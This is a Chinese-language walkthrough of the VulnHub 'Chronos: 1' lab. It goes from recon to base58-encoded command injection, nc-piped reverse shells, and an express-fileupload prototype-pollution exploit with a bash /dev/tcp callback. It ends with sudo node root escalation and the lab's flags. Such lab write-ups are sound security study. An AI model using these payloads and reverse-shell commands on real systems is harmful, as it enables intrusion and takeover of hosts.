Week3

---

**Name**: Chronos: 1

**Date release**: 9 Aug 2021

**Author**: [AL1ENUM](https://www.vulnhub.com/author/al1enum,745/)

**Series**: [Chronos](https://www.vulnhub.com/series/chronos,495/)

**Download**:https://download.vulnhub.com/chronos/Chronos.ova

**Description**

**Difficulty** : medium

This works better with VirtualBox rather than VMware.

---

## 一、信息收集

### 1.主机发现

```
sudo netdiscover -r 10.0.2.0/24
#netdiscover工具的使用中，发现在网段的真实掩码-8会扫描更快
```

![image-20211103144507677](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103144507677.png)

![image-20211103144432159](Week3.assets/image-20211103144432159.png)

发现存活主机，判断靶机IP为10.0.2.6 

### 2.端口扫描

```
sudo nmap -p- 10.0.2.6
```

![image-20211011164411320](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011164411320.png)

### 3.探测端口服务

```
sudo nmap -p22,80,8000 -sV 10.0.2.6
```

![image-20211103144832211](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103144832211.png)

探测到的信息：

​	22端口：开放**SSH**（7.6p1）

​	80端口：**Apache服务**

​	目标为**Ubuntu**系统

​	8000端口：**Node.js**    **Express框架**

### 4.浏览器访问80端口

访问80端口：

```
访问http://10.0.2.6
```

![image-20211011165055754](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165055754.png)

信息:Chronos(靶机名)-Date（日期）&Time（时间）

查看源代码，发现**JS脚本**

![image-20211011165144187](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165144187.png)

复制到编辑器内，发现“杂乱晦涩”

![image-20211011165214660](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165214660.png)

使用数据分析工具CyberChef调用“JavaScript Beautify”模块“美化”

![image-20211011170318994](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011170318994.png)

![image-20211011170456326](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011170456326.png)

纵观美化后的代码，发现函数名称仍是为编码处理的，但发现可疑信息（URL）

```
http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
```

分析：chronos（靶机名）

​	local（本地/本机）

​	8000（结合之前探测到的信息8000端口也是目标开放的端口）

​	data?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL（data变量**通过format赋值定位某页面**）

猜测：目标靶机80端口页面嵌入的脚本中包含了该URL

​	怀疑是否**在该页面加载的过程中**：会去访问该URL-->并从中读取相应页面资源-->放置到当前页面中-->显示相应信息

### 5.页面绑定hosts

思路：尝试在本地将10.0.2.6和chronos.loacl**绑定**-->那么重新访问目标80端口（http://10.0.2.6）时-->JS脚本就能**顺利访问**脚本中的URL-->并从中**读取**相应**页面资源**-->放置到当前页面中-->显示相应的**信息**-->页面应该会有**变化**

操作：

```
sudo vi /etc/hosts     
#编辑hosts 手动增加 IP&域名 绑定10.0.2.6和chronos.local
```

![image-20211011171039018](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171039018.png)

```
ping chronos.local
#验证绑定是否成功，结果显示域名被正确解析到目标靶机IP
```

![image-20211011171625340](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171625340.png)

结果显示，成功解析

刷新/重新访问目标80端口（http://10.0.2.6）

![image-20211011171725044](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171725044.png)

页面上**打印了时间**，这样发生的**变化**-->意味着JS脚本可以**正常访问**到URL上的资源了-->至此建立了正常的连接

---

## 二、漏洞发现

### 1.截断抓包分析

打开Burpsuite，配置代理，利用截断功能，分析访问页面过程中发生的**通信过程**

![image-20211011172836302](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172836302.png)

![image-20211011172903372](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172903372.png)

![image-20211011172917467](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172917467.png)

通过分析发现**目标响应返回了当前时间信息**，也就是在页面上的显示的时间信息



将请求Request发送到Repeater内，不进行修改

![image-20211011173018704](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011173018704.png)

不修改时Send重放，正常访问200OK



修改后Send提交请求，能接收到服务器端的响应信息（时间）

![image-20211103152254081](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103152254081.png)

故可以得到一点，**format参数后的字符**4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL，**对于返回时间是很关键的**

### 2.命令注入漏洞

使用CyberChef的Magic模块对该字符进行解密

![image-20211103151711496](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103151711496.png)

得到的明文为：（Base58编码...）

```
'+Today is %A, %B %d, %Y %H:%M:%S.'
```

看到明文这样的格式，想到了Linux的date命令

```
date
```

date后添加明文内容

```
date '+Today is %A, %B %d, %Y %H:%M:%S.'
```

![image-20211103152932781](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103152932781.png)

**猜测当访问Web程序URL时，服务端使用的是这条操作系统指令，那么是否可以用符号连接执行命令注入呢？**

```
date '+Today is %A, %B %d, %Y %H:%M:%S.' || ls  #不可行
```

```
date '+Today is %A, %B %d, %Y %H:%M:%S.' && ls #可行
```

![image-20211103153232194](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153232194.png)

结合之前的URL，服务端能执行的内容必须是Base58编码之后的格式

故使用CyberChef将&&ls转为Base58编码形式

![image-20211103153344923](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153344923.png)

```
得到：&&ls   --Base58编码-->   yZSGA
```

BurpSuite:

```
--Repeater内将format参数值替换为yZSGA-->Send重放
```

![image-20211103153429917](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153429917.png)

成功接受到服务端响应-->返回当前目录下的文件信息-->**确认存在命令注入漏洞**

---

## 三、漏洞利用

### 1.利用思路

如何利用命令注入漏洞？-->**尝试查看用户可执行文件目录（/bin）**-->看是否有可利用点

CyberChef:

```
&&ls /bin --To Base58-->VAZYW9RHPu6D（下面不再为转码贴附图片**-_-**）
```

BurpSuite:

```
--Repeater内将format参数值替换为VAZYW9RHPu6D-->Send重放
```

![image-20211103153619965](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153619965.png)

整理目前发现的**可利用信息**：

1.发现存在bash，之后若能获取shell，则可以执行bashell反弹

![image-20211104085536530](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085536530.png)

2.发现存在nc，但不确定nc版本是否有-e参数方便我们建立反弹shell （nc的-e参数具有程序重定向--连接执行的作用）

![image-20211103153858760](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153858760.png)

### 2.使用nc建立连接

#### 验证nc是否可执行

进行测试，确认nc命令能否正常执行？能否与kali建立反弹连接？

kali:

```
nc -nvlp 4444    #nc侦听4444端口
```

![image-20211103153939292](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153939292.png)

CyberChef:

```
&&nc 10.0.2.4 4444 --To Base58-->2an39LDoLgxbVq6NMgJeN3RL7
```

BurpSuite:

```
--Repeater内将format参数值替换为2an39LDoLgxbVq6NMgJeN3RL7-->Send重放
```

![image-20211104085113440](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085113440.png)

显示报错，但在kali端监听端发现**连接可以被正常建立**

![image-20211104085132470](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085132470.png)



#### 验证nc是否包含-e参数

##### 1.若有则使用-e参数加载反弹shell

kali：

```
nc -nvlp 4444  #nc侦听4444端口
```

![image-20211104085819231](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085819231.png)

CyberChef:

```
&&nc 10.0.2.4 4444 -e /bin/bash --To Base58-->ajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH
```

BurpSuite:

```
--Repeater内将format参数值替换为ajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH-->Send重放
```

![image-20211104090046890](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104090046890.png)

仍然报错，说明不包含-e参数，且nc建立连接失败，则**确定目标系统上nc版本不包含-e参数**

##### 2.若无则可以使用**nc串联**的方法通过管道方式在两个侦听接口上获得反弹shell

kali:

```
nc -nvlp 4444  #nc侦听4444端口
```

```
nc -nvlp 5555  #nc侦听5555端口
```

![image-20211104092959229](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104092959229.png)

CyberChef:

```
&&nc 10.0.2.4 4444 | /bin/bash | nc 10.0.2.4 5555
```

--To Base58-->

```
7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS
```

BurpSuite:

```
--Repeater内将format参数值替换为7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS-->Send重放
```

![image-20211104093156854](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104093156854.png)

至此，nc**建立连接成功**

### 3.寻找信息

```
ls
```

```
pwd
```

![image-20211104093314649](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104093314649.png)

发现在当前/opt/chronos目录下，并**没有类似flag的信息**

尝试查看其他目录

```
cat /etc/passwd
```

​	![image-20211104094438824](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094438824.png)	

​	

```
cd /home
```

```
ls
```

![image-20211104094604888](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094604888.png)

​	发现在home目录下**存在用户imera**

​	尝试查看imera用户文件

```
cd imera
```

```
ls
```

```
cat user.txt
```

```
ls -l
```

![image-20211104094950343](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094950343.png)

很可惜，查看失败，发现只有imera用户自己可以对user.txt进行读写，**只有提权才能执行查看**

---

## 四、权限提升

### 1.初次尝试提权

```
id  #当前用户权限
```

![image-20211104095325207](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095325207.png)

是一个名为www-data的用户

```
uname -a   #利用是否存在内核漏洞
```

![image-20211104095419553](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095419553.png)

```
sudo -l	#利用是否存在sudo命令漏洞
```

没有反馈.

利用常见的提权方法，都没能找到突破口。



至此，陷入了困境...-_-

---

### 2.代码审计

尝试在其他目录看能否发现突破口

```
cd /opt/chronos
```

```
ls
```

![image-20211104095949572](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095949572.png)

```
cat package.json
```


![image-20211104100153967](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100153967.png)

>{
>  "dependencies": {
>    "bs58": "^4.0.1",
>    "cors": "^2.8.5",
>    "express": "^4.17.1"
>  }
>}

```
cat app.js
```

![image-20211104100502437](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100502437.png)

>// created by alienum for Penetration Testing
>const express = require('express');
>const { exec } = require("child_process");
>const bs58 = require('bs58');
>const app = express();
>
>const port = 8000;
>
>const cors = require('cors');
>
>
>app.use(cors());
>
>app.get('/', (req,res) =>{
>
>res.sendFile("/var/www/html/index.html");
>});
>
>app.get('/date', (req, res) => {
>
>var agent = req.headers['user-agent'];
>var cmd = 'date ';
>const format = req.query.format;
>const bytes = bs58.decode(format);
>var decoded = bytes.toString();
>var concat = cmd.concat(decoded);
>if (agent === 'Chronos') {
>   if (concat.includes('id') || concat.includes('whoami') || concat.includes('python') || concat.includes('nc') || concat.includes('bash') || concat.includes('php') || concat.includes('which') || concat.includes('socat')) {
>
>   res.send("Something went wrong");
>
>   }
>   exec(concat, (error, stdout, stderr) => {
>       if (error) {
>           console.log(`error: ${error.message}`);
>           return;
>       }
>       if (stderr) {
>           console.log(`stderr: ${stderr}`);
>           return;
>       }
>       res.send(stdout);
>   });
>}
>else{
>
>   res.send("Permission Denied");
>}
>})
>
>app.listen(port,() => {
>
>console.log(`Server running at ${port}`);
>
>})
>

```
cd ..                   #来到上级目录
```

```
ls 
```

![image-20211104100626091](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100626091.png)

发现chronos-v2文件夹

```
cd chronos-v2
```

```
ls -l
```

![image-20211104100808654](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100808654.png)

发现是另一个web应用，index.html（主页面），frontend（前端），backend（后端）

进入backend目录

```
cd backend
```

```
ls -l
```

![image-20211104100901040](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100901040.png)

同样看到了package.json文件，进行查看

```
cat package.json
```

![image-20211104101138166](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101138166.png)

>{
>  "name": "some-website",
>  "version": "1.0.0",
>  "description": "",
>  "main": "server.js",
>  "scripts": {
>    "start": "node server.js"
>  },
>  "author": "",
>  "license": "ISC",
>  "dependencies": {
>    "ejs": "^3.1.5",
>    "express": "^4.17.1",
>    **"express-fileupload": "^1.1.7-alpha.3"**   #文件上传？？？？？？
>  }
>}

```
cat server.js
```

![image-20211104101352160](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101352160.png)

>const express = require('express');
>const fileupload = require("express-fileupload");
>const http = require('http')
>
>const app = express();
>
>app.use(fileupload({ parseNested: true }));
>
>app.set('view engine', 'ejs');
>app.set('views', "/opt/chronos-v2/frontend/pages");
>
>app.get('/', (req, res) => {
>   res.render('index')
>});
>
>const server = http.Server(app);
>**const addr = "127.0.0.1"**         #reason：为什么扫描的时候没有扫描到8080端口 answer：因为Web应用只有在本机才能访问
>**const port = 8080;**
>server.listen(port, addr, () => {
>   console.log('Server listening on ' + addr + ' port ' + port);
>});

### 3.搜索大法好

express-fileupload漏洞

百度：[流行的Node.js库中存在原型污染漏洞，可致Web应用程序遭受DoS和远程Shell攻击_Posix (sohu.com)](https://www.sohu.com/a/412389503_100002744)

Google：https://blog.p6.is/Real-World-JS-1/

**发现EXP**

>import requests
>
>cmd = 'bash -c "bash -i &> /dev/tcp/p6.is/8888 0>&1"'
>
>#pollute
>
>requests.post('http://p6.is:7777', files = {'__proto__.outputFunctionName': (
>    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})
>
>#execute command
>
>requests.get('http://p6.is:7777')
>

kali:

根据ip修改EXP

```
vi exp.py
```

![image-20211104101833596](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101833596.png)

>import requests
>
>cmd = 'bash -c "bash -i &> /dev/tcp/10.0.2.4/4444 0>&1"'
>
>#pollute
>
>requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName': (
>    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})
>
>#execute command
>
>requests.get('http://127.0.0.1:8080')

已将exp写在本地，需将该exp.py上传至目标端

kali：

```
python3 -m http.server 80
```

![image-20211104102630662](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104102630662.png)

shell：

```
cd /tmp   #易向里写文件
```

```
pwd
```

```
ls
```

```
wget http://10.0.2.4/exp.py
```

```
ls
```

![image-20211104102839677](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104102839677.png)

exp.py上传成功

kali:

```
nc -nvlp 4444
```

![image-20211104103155596](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103155596.png)

shell：

```
python3 exp.py
```

![image-20211104103241230](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103241230.png)

**成功建立反弹shell**，当前用户为imera

结合之前的信息收集，得知imera用户主目录下有**user.txt**文件，进行查看

```
pwd
```

```
cd
```

```
pwd
```

```
ls -l
```

![image-20211104103811115](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103811115.png)

```
cat user.txt
```

![image-20211104103921395](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103921395.png)

```
byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK
```

### 4.最终提权

尝试进入root目录

```
cd /root
```

![image-20211104104228705](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104228705.png)

失败，在此需要提权

尝试有没有sudo提权漏洞

```
sudo -l 
```

![image-20211104104353472](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104353472.png)

发现用户imera在没有root用户密码的权限下，只执行sudo，**可以执行node和npm命令**

搜集发现了一段代码（调用node执行生成一个子进程，子进程运行/bin/bash）

```
sudo node -e 'child_process.spawn("/bin/bash",{stdio:[0,1,2]})'   
```

```
id
```

![image-20211104104738393](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104738393.png)

发现已经**成功提权**为root用户

```
cd root
```

```
pwd
```

```
ls
```

```
cat root.txt
```

![image-20211104104834470](https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104834470.png)

```
YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
```

---

## 彩蛋

CyberChef:

>user.txt
>
>byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK
>
>-->o chronos pernaei file mou.
>
>译-->我们签署了谅解备忘录。

>root.txt
>
>YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
>
>-->apopse siopi mazeuoume oneira.
>
>译-->我很高兴见到你。













